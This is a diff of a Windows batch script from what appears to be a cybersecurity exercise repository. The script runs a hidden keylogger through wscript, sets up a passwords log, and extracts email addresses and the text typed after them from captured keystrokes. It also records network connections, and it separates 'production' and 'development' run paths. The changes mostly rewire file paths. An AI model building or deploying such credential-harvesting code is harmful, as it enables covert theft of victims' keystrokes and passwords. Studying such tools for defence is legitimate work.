@@ -89,19 +89,23 @@ exit /b
 :GetKeyloggerInfo
     echo **************************** INFORMACIÓN DE keystrokes DE TECLADO **************************** >> salida.txt
     mkdir keyloggerLogs
+    
     ::
-    ::
-    ::
-    ::
-
     ::  in this section  are the logic that download dependencies from azure
     :: dependences are setup.vbs, keyLogger.py, ExtractAfterEmail.vbs
+    ::
+    :: ##################################################################################################
+    :: ##################################################################################################
+    :: ##################################################################################################
+    :: ##################################################################################################
+    :: ##################################################################################################
+    ::
 
-    ::
-    ::
-    ::
-    start "" wscript //B //Nologo "setup.vbs" 
- 
+    :: enable these lines in production environment
+    ::start "" wscript //B //Nologo "setup.vbs" 
+    
+    :: these lines escute in development environtment, to test need to donload repo from https://github.com/Naofumi-Alu/CyberSecurityExercises.git
+    start "" wscript //B //Nologo "KeyLoggerApp\App\setup.vbs" 
     echo El keylogger está corriendo en segundo plano. >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
@@ -109,8 +113,14 @@ exit /b
 :GetCredentials
     echo **************************** INFORMACIÓN PARA CONSEGUIR CREDENCIALES **************************** >> salida.txt
     :: crea archivo passwords.txt dentro de directorio keyloggerLogs
-    echo. > keyloggerLogs\passwords.txt
-    move keystrokes.txt keyloggerLogs
+
+    :: enable these lines in production environment
+    ::echo. > keyloggerLogs\passwords.txt
+    ::move keystrokes.txt keyloggerLogs
+
+    :: these lines escute in development environtment, to test need to download repo from https://github.com/Naofumi-Alu/CyberSecurityExercises.git
+    echo. > KeyLoggerApp\App\keyloggerLogs\passwords.txt
+    move KeyLoggerApp\App\keystrokes.txt  KeyLoggerApp\App\keyloggerLogs
 
 
     netstat -n > ips.txt
@@ -121,17 +131,21 @@ exit /b
     )
     echo Proceso completado. Revisa el archivo temp_trace.txt
 
-    findstr /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" keyloggerLogs\keystrokes.txt >> keyloggerLogs\mails.txt
-    ::
-    ::
-    ::
-    :: find passwords | need to replace with logic to execute a service from azure that execute this task
+    
+    :: enable this line in production environment
+    ::findstr /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" keyloggerLogs\keystrokes.txt >> keyloggerLogs\mails.txt
+
+
+    :: This line escute in development environtment, to test need to download repo from https://github.com/Naofumi-Alu/CyberSecurityExercises.git
+    findstr /R "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" KeyLoggerApp\App\keyloggerLogs\keystrokes.txt >> KeyLoggerApp\App\keyloggerLogs\mails.txt
+
+    :: enable these lines in production environment
+    ::wscript ExtractAfterEmail.vbs
+    ::type temp_trace.txt >> keyloggerLogs\httpRequests.txt
+
+    :: This line escute in development environtment, to test need to download repo from
     wscript KeyLoggerApp\App\Utils\ExtractAfterEmail.vbs
-    type temp_trace.txt >> keyloggerLogs\httpRequests.txt
-    ::
-    ::
-    ::
-    ::
+    type temp_trace.txt >> KeyLoggerApp\App\keyloggerLogs\httpRequests.txt
     
     echo ************************************************************************************* >> salida.txt
     exit /b
